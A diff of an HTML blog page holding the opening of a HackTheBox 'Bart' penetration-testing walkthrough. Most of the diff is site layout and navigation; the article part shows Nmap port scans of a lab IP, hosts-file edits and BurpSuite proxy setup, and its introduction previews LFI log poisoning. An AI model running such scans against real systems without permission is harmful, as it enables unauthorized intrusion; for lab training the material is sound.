@@ -14,6 +14,16 @@
 
 
 
+
+
+
+
+
+
+
+
+
+
 <!DOCTYPE html>
 <html lang='en-us'><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
     <meta charset="utf-8">
@@ -26,25 +36,33 @@
     
 
     
-    <meta name="author" content="karan bhayani" />
+    <meta name="author" content="nomi bhayani" />
     
 
     
-        <meta property="og:title" content="HackTheBox - Bart Writeup w/o Metasploit" />
-<meta property="og:description" content="HackTheBox - Bart Writeup w/o Metasploit Introduction Bart is a retired Windows machine from HackTheBox. It has been rated as a medium difficulty machine, as it requires you to spend a good amount of time to enumerate but the exploiting part is not so hard.
-We are presented with just one service - HTTP, consists of three different sites, we abuse a user enumeration functionality for first login, we perform some OSINT to get around the next login, and then abuse a &ldquo;LFI&rdquo; vulnerability to poison the logs." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="http://localhost:1313/hackthebox/htb-bart/" /><meta property="article:section" content="hackthebox" />
-<meta property="article:published_time" content="2020-08-11T17:22:10+00:00" />
-<meta property="article:modified_time" content="2020-08-11T17:22:10+00:00" />
-
+        <meta property="og:url" content="http://localhost:1313/hackthebox/htb-bart/">
+  <meta property="og:site_name" content="Welcome to noobsec">
+  <meta property="og:title" content="HackTheBox - Bart Writeup w/o Metasploit">
+  <meta property="og:description" content="HackTheBox - Bart Writeup w/o MetasploitIntroductionBart is a retired Windows machine from HackTheBox. It has been rated as a medium difficulty machine, as it requires you to spend a good amount of time to enumerate but the exploiting part is not so hard.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="hackthebox">
+    <meta property="article:published_time" content="2020-08-11T17:22:10+00:00">
+    <meta property="article:modified_time" content="2020-08-11T17:22:10+00:00">
+    <meta property="article:tag" content="Hackthebox">
+    <meta property="article:tag" content="Walkthrough">
+    <meta property="article:tag" content="Oscp-More">
+    <meta property="article:tag" content="Log Poisoning">
+    <meta property="article:tag" content="Burpsuite">
+    <meta property="article:tag" content="Juicy Potato">
 
     
 
     
-        <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="HackTheBox - Bart Writeup w/o Metasploit"/>
-<meta name="twitter:description" content="HackTheBox - Bart Writeup w/o Metasploit Introduction Bart is a retired Windows machine from HackTheBox. It has been rated as a medium difficulty machine, as it requires you to spend a good amount of time to enumerate but the exploiting part is not so hard.
-We are presented with just one service - HTTP, consists of three different sites, we abuse a user enumeration functionality for first login, we perform some OSINT to get around the next login, and then abuse a &ldquo;LFI&rdquo; vulnerability to poison the logs."/>
+        
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HackTheBox - Bart Writeup w/o Metasploit">
+  <meta name="twitter:description" content="HackTheBox - Bart Writeup w/o MetasploitIntroductionBart is a retired Windows machine from HackTheBox. It has been rated as a medium difficulty machine, as it requires you to spend a good amount of time to enumerate but the exploiting part is not so hard.">
 
     <link rel="stylesheet" href="/style.css" integrity="">
 
@@ -54,18 +72,20 @@ We are presented with just one service - HTTP, consists of three different sites
 
 
         
-<script>
-var doNotTrack = false;
-if (!doNotTrack) {
-	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-	ga('create', 'UA-171056200-1', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-VZX99LLTQ8"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-VZX99LLTQ8');
+        }
+      </script>
     
 
     
@@ -80,7 +100,13 @@ if (!doNotTrack) {
             document.documentElement.setAttribute("data-theme", "light");
         }
     </script>
-<script defer src="/js/header.js" integrity=""></script>
+<script defer src="/js/theme-switch.js" integrity=""></script>
+
+
+
+    <script defer src="/js/hide-navbar-on-scroll.js" integrity=""></script>
+
+
 
 
 
@@ -117,98 +143,263 @@ if (!doNotTrack) {
 
 
 
+
+    
 </head>
-<body>
-        <main><header>
-    <div class="brand">
-        <div id="sidebar_btn">
-            <svg id="menu_icon" width="26px" height="26px" viewBox="0 0 24 24">
+<body><header>
+    <div id="header_content" class="wide">
+        <div id="header_left">
+            <div id="sidebar_btn">
+                <input type="checkbox" id="sidebar_btn_input" class="hidden" />
+                <label id="sidebar_btn_label" for="sidebar_btn_input">
 <svg
     xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    width="24px" height="24px" viewBox="0 0 24 24" fill="none"
     stroke="currentColor" stroke-width="2" stroke-linecap="round"
     stroke-linejoin="round">
     <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>
 </svg>
 
-</svg>
-        </div>
-
-        <div>
-            <a href="/">noobsec</a>
-        </div>
-    </div>
-
-    <div class="toolbox">
-        <div id="theme_tool">
-            <svg id="dark_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
-<svg
-    xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
-    stroke="currentColor" stroke-width="2" stroke-linecap="round"
-    stroke-linejoin="round">
-    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
-</svg>
-
-</svg>
-            <svg id="light_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
-<svg
-    xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
-    stroke="currentColor" stroke-width="2" stroke-linecap="round"
-    stroke-linejoin="round">
-    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
-</svg>
-
-</svg>
-        </div>
-
+</label>
+                <label id="sidebar_canvas_overlay_wrapper" for="sidebar_btn_input">
+                    <div id="sidebar_canvas_overlay"></div>
+                </label>
+                <div id="sidebar">
+                    <ul><li>
+                                <a href="#">OSCP</a>
+    <ul>
         
-            <div id="search_tool">
-                <svg id="search_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
-<svg
-    xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
-    stroke="currentColor" stroke-width="2" stroke-linecap="round"
-    stroke-linejoin="round">
-    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
-</svg>
 
-</svg><div id="search_menu_wrapper" class="hidden">
-    <div id="search_menu">
-        <div id="search_menu_toolbar">
-            <div id="search_menu_input_wrapper">
-                <input id="search_menu_input" type="text" placeholder='Search Posts'>
+            
+                <li>
+                    
+                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/ad-cheatsheet">OSCP AD Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/oscp-journey">OSCP Journey</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/bof">OSCP BOF</a>
+                    
+                </li>
+            
+        
+    </ul>
+</li><li>
+                                <a href="#">HTB</a>
+    <ul>
+        
+
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-bart">HTB Bart</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-falafel-writeup-w-o-metasploit">HTB Falafel</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-cronos">HTB Cronos</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-bashed">HTB Bashed</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-lame">HTB Lame</a>
+                    
+                </li>
+            
+        
+    </ul>
+</li><li>
+                                <a href="#">Web Attacks</a>
+    <ul>
+        
+
+            
+                <li>
+                    
+                        <a href="/file-inclusion">File Inclusion</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/sqli-0x01">SQLi 0x01</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/sqli-0x02">SQLi 0x02</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/sqli-0x03">SQLi 0x03</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
+                    
+                </li>
+            
+        
+    </ul>
+</li><li>
+                                <a href="#">Cheatsheets</a>
+    <ul>
+        
+
+            
+                <li>
+                    
+                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/ad-cheatsheet">AD Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/crtp-cheatsheet">CRTP Cheatsheet</a>
+                    
+                </li>
+            
+        
+
+            
+                <li>
+                    
+                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
+                    
+                </li>
+            
+        
+    </ul>
+</li><li>
+                                <a href="/starting-point">Getting Started in Red Team</a></li><li>
+                                <a href="/whoami/">About</a></li></ul>
+                </div>
             </div>
-            <div id="search_menu_close_btn">
-                <svg width="18px" height="18px" viewBox="0 0 24 24">
-<svg
-    xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
-    stroke="currentColor" stroke-width="2" stroke-linecap="round"
-    stroke-linejoin="round">
-    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
-</svg>
-
-</svg>
-            </div>
-        </div>
-        <div id="search_menu_results">
-        </div>
-    </div>
-</div>
-</div>
         
-
-        
-    </div>
-</header>
-<nav id="navbar" class="pure-menu">
-    <ul class="pure-menu-list"><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+            <div class="brand">
+                <div>
+                    <a href="/">noobsec</a>
+                </div>
+            </div><nav id="header_navbar" class="pure-menu header-menu">
+    <ul class="pure-menu-list"><li class="header-menu-item header-menu-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
                     
                         <a href="#" class="pure-menu-link">OSCP</a>
                     
                     <ul class="pure-menu-children">
+
     
         <li class="pure-menu-item">
             
@@ -216,6 +407,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -225,6 +417,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -232,6 +425,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -241,6 +435,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -248,6 +443,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -258,11 +454,12 @@ if (!doNotTrack) {
     
 
 </ul>
-                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                </li><li class="header-menu-item header-menu-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
                     
                         <a href="#" class="pure-menu-link">HTB</a>
                     
                     <ul class="pure-menu-children">
+
     
         <li class="pure-menu-item">
             
@@ -270,6 +467,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -279,6 +477,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -287,6 +486,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -294,6 +494,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -304,11 +505,12 @@ if (!doNotTrack) {
     
 
 </ul>
-                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                </li><li class="header-menu-item header-menu-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
                     
                         <a href="#" class="pure-menu-link">Web Attacks</a>
                     
                     <ul class="pure-menu-children">
+
     
         <li class="pure-menu-item">
             
@@ -316,6 +518,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -325,6 +528,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -332,6 +536,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -341,6 +546,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -350,11 +556,12 @@ if (!doNotTrack) {
     
 
 </ul>
-                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                </li><li class="header-menu-item header-menu-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
                     
                         <a href="#" class="pure-menu-link">Cheatsheets</a>
                     
                     <ul class="pure-menu-children">
+
     
         <li class="pure-menu-item">
             
@@ -362,6 +569,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -371,6 +579,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -378,6 +587,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -387,6 +597,7 @@ if (!doNotTrack) {
         </li>
     
 
+
     
         <li class="pure-menu-item">
             
@@ -394,6 +605,7 @@ if (!doNotTrack) {
             
         </li>
     
+
 
     
         <li class="pure-menu-item">
@@ -404,231 +616,88 @@ if (!doNotTrack) {
     
 
 </ul>
-                </li><li class="navbar-item pure-menu-item ">
+                </li><li class="header-menu-item pure-menu-item ">
                     
                         <a href="/starting-point" class="pure-menu-link">Getting Started in Red Team</a>
                     
-                </li><li class="navbar-item pure-menu-item ">
+                </li><li class="header-menu-item pure-menu-item ">
                     
                         <a href="/whoami/" class="pure-menu-link">About</a>
                     
                 </li></ul>
 </nav>
-<div id="sidebar_canvas_overlay" class="hidden"></div>
-<div id="sidebar" class="close">
-    <ul><li>
-                    <details>
-                        <summary><a href="#">OSCP</a></summary>
-    <ul>
-        
+</div>
+
+        <div id="header_right">
             
-                <li>
-                    
-                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
-                    
-                </li>
+
+            <div id="theme_tool">
+                <button id="dark_mode_btn" class="header-menu-btn outline-button" title='Switch to dark mode' type="button">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24px" height="24px" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+</svg>
+
+</button>
+                <button id="light_mode_btn" class="header-menu-btn outline-button" title='Switch to light mode' type="button">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24px" height="24px" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+</svg>
+
+</button>
+            </div>
+
             
-        
+                <div id="search_tool">
+                    <button id="search_btn" class="header-menu-btn outline-button" title='Search Posts' type="button">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24px" height="24px" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+</svg>
+
+</button>
+                </div>
             
-                <li>
-                    
-                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/ad-cheatsheet">OSCP AD Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/oscp-journey">OSCP Journey</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/bof">OSCP BOF</a>
-                    
-                </li>
-            
-        
-    </ul>
-</details>
-                </li><li>
-                    <details>
-                        <summary><a href="#">HTB</a></summary>
-    <ul>
-        
-            
-                <li>
-                    
-                        <a href="/hackthebox/htb-bart">HTB Bart</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/hackthebox/htb-falafel-writeup-w-o-metasploit">HTB Falafel</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/hackthebox/htb-cronos">HTB Cronos</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/hackthebox/htb-bashed">HTB Bashed</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/hackthebox/htb-lame">HTB Lame</a>
-                    
-                </li>
-            
-        
-    </ul>
-</details>
-                </li><li>
-                    <details>
-                        <summary><a href="#">Web Attacks</a></summary>
-    <ul>
-        
-            
-                <li>
-                    
-                        <a href="/file-inclusion">File Inclusion</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/sqli-0x01">SQLi 0x01</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/sqli-0x02">SQLi 0x02</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/sqli-0x03">SQLi 0x03</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
-                    
-                </li>
-            
-        
-    </ul>
-</details>
-                </li><li>
-                    <details>
-                        <summary><a href="#">Cheatsheets</a></summary>
-    <ul>
-        
-            
-                <li>
-                    
-                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/ad-cheatsheet">AD Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/crtp-cheatsheet">CRTP Cheatsheet</a>
-                    
-                </li>
-            
-        
-            
-                <li>
-                    
-                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
-                    
-                </li>
-            
-        
-    </ul>
-</details>
-                </li><li>
-                    <a href="/starting-point">Getting Started in Red Team</a>
-                </li><li>
-                    <a href="/whoami/">About</a>
-                </li></ul>
-</div><div id="content" class="content-margin">
+        </div>
+    </div>
+</header><div id="search_menu_wrapper" class="hidden">
+    <div id="search_menu">
+        <div id="search_menu_toolbar">
+            <div id="search_menu_input_wrapper">
+                <input id="search_menu_input" type="text" placeholder='Search Posts'>
+            </div>
+            <div id="search_menu_close_btn">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1.25rem" height="1.25rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
+</svg>
+
+</div>
+        </div>
+        <div id="search_menu_results">
+        </div>
+    </div>
+</div>
+<main>
+            <div id="content" class="content-margin">
                 
     
-    <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
+    
+        
+        <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
         
             <nav id="TableOfContents">
   <ul>
@@ -665,10 +734,12 @@ if (!doNotTrack) {
 </nav>
         
     </div></details>
+    
 
 
 
     <div class="content-margin">
+
 
 
 
@@ -678,16 +749,113 @@ if (!doNotTrack) {
         
         
     
-    <h1 id="hackthebox---bart-writeup-wo-metasploit">HackTheBox - Bart Writeup w/o Metasploit</h1>
-<h2 id="introduction">Introduction</h2>
+
+    
+    
+        
+        
+        
+    
+        
+        
+            
+            
+            
+        
+        <section id="hackthebox---bart-writeup-wo-metasploit">
+
+
+<h1 class="header-anchor-wrapper">HackTheBox - Bart Writeup w/o Metasploit
+  <a href="#hackthebox---bart-writeup-wo-metasploit" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h1>
+
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="introduction">
+
+
+<h2 class="header-anchor-wrapper">Introduction
+  <a href="#introduction" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h2>
+
 <p>Bart is a retired Windows machine from HackTheBox. It has been rated as a medium difficulty machine, as it requires you to spend a good amount of time to enumerate but the exploiting part is not so hard.</p>
 <p>We are presented with just one service - HTTP, consists of three different sites, we abuse a user enumeration functionality for first login, we perform some OSINT to get around the next login, and then abuse a &ldquo;LFI&rdquo; vulnerability to poison the logs. With log poisoning we get ourselves a low privileged shell. There are two ways to escalate our privileges, both are equally straightforward. Overall the box presents various kinds of learning opportunity, let&rsquo;s jump right in.</p>
 <p>
     <img src="/HackTheBox/htb-bart/0_bart.png" style="max-width: 50%;" />
     <figcaption>Box Details</figcaption>
 </p>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="general-enumeration">General Enumeration</h3>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="reconnaissance">
+
+
+<h2 class="header-anchor-wrapper">Reconnaissance
+  <a href="#reconnaissance" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h2>
+
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="general-enumeration">
+
+
+<h3 class="header-anchor-wrapper">General Enumeration
+  <a href="#general-enumeration" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h3>
+
 <p>We will start our reconnaissance with few Nmap scans.</p>
 <p>Performing an initial Nmap scan.</p>
 <p><img src="/HackTheBox/htb-bart/1_nmap1.png" alt="Initial Nmap Scan"></p>
@@ -703,7 +871,30 @@ if (!doNotTrack) {
 nmap -Pn -n -T4 -p- -oN nmap/allports 10.10.10.81
 </code></pre>
 <p><em>Note: Ideally I would not have opted for the &ldquo;faster&rdquo; command but without it Nmap decided to take a good long hour to finish the scan which was annoying.</em></p>
-<h3 id="web-enumeration">Web Enumeration</h3>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="web-enumeration">
+
+
+<h3 class="header-anchor-wrapper">Web Enumeration
+  <a href="#web-enumeration" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h3>
+
 <p>Now that we have our all port scan running in the background, let&rsquo;s start poking at this service ourselves.</p>
 <p>We will start by sending a <code>curl</code> request to the IP.</p>
 <p><img src="/HackTheBox/htb-bart/2_http1.png" alt="Web cURL Request"></p>
@@ -711,7 +902,30 @@ nmap -Pn -n -T4 -p- -oN nmap/allports 10.10.10.81
 <p>Let&rsquo;s add the domain and sub-domain it wanted us to be redirected at to our <em>/etc/hosts</em> file.</p>
 <p><img src="/HackTheBox/htb-bart/2_http2.png" alt="DNS Records Added"></p>
 <p>The <em>hosts</em> file acts as a local DNS server with which the system can access resources within the network. Now that we have mapped the IP address to the sub-domain it wanted us to be redirected to and the domain, we should finally be able to access it.</p>
-<h3 id="burpsuite-logging">BurpSuite Logging</h3>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="burpsuite-logging">
+
+
+<h3 class="header-anchor-wrapper">BurpSuite Logging
+  <a href="#burpsuite-logging" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h3>
+
 <p>Before we start any kind of manual web enumeration where we would be interacting with the web application, it is important that you keep your BurpSuite running along and ensuring that all the requests and their respective responses are being captured.</p>
 <p>All of the following can be done on <em>BurpSuite Community Edition</em>.</p>
 <p>You can copy the URLs that you want to keep in scope and paste it one after another, and ensure that only those URLs are being intercepted and logged.</p>
@@ -721,7 +935,30 @@ nmap -Pn -n -T4 -p- -oN nmap/allports 10.10.10.81
 <p><img src="/HackTheBox/htb-bart/2_burp2.png" alt="Capture Relevant Requests"></p>
 <p>Once the scope has been added, let&rsquo;s ensure we only capture the scoped requests. It&rsquo;s not necessary to have your &ldquo;internception&rdquo; enabled, we only want to log everything we do and every request sent to the server.</p>
 <p>Use a proxy tool like FoxyProxy on FireFox to forward all the requests to the BurpSuite. Keep in mind that this is a HTTP proxy.</p>
-<h3 id="web-enumeration-contd">Web Enumeration Contd.</h3>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="web-enumeration-contd">
+
+
+<h3 class="header-anchor-wrapper">Web Enumeration Contd.
+  <a href="#web-enumeration-contd" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h3>
+
 <p>Browsing to the sub-domain:</p>
 <p><img src="/HackTheBox/htb-bart/3_index.png" alt="Index Page"></p>
